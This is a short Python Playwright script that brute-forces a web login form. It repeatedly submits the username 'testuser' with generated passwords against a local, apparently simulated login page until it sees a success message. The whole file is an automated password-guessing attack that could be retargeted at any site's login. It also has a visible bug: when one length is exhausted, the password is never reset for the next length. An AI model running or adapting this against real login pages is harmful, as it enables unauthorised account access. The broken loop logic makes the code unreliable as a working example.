import time
from playwright.sync_api import sync_playwright

from password_cracker import generate_next_string
from password_cracker import ALPHABET
from password_cracker import MIN_LENGTH
from password_cracker import MAX_LENGTH


def run():
    with sync_playwright() as p:
        browser = p.chromium.launch(headless=False)
        page = browser.new_page()

        # copy login.html to /tmp
        page.goto("file:///tmp/login.html")

        # try to crack password
        length = MIN_LENGTH
        password = ALPHABET[0] * length
        while length <= MAX_LENGTH:
            page.fill("#username", "testuser")
            page.fill("#password", password)
            page.click("button[type='submit']")
            page.wait_for_selector("#result", state="visible", timeout=5000)
            result_text = page.inner_text("#result")
            if result_text == "Login successful (simulated)!":
                print(f"CRACKED! Password: {password}")
                break

            password = generate_next_string(password)
            if not password:
                length += 1

        browser.close()

if __name__ == "__main__":
    run()
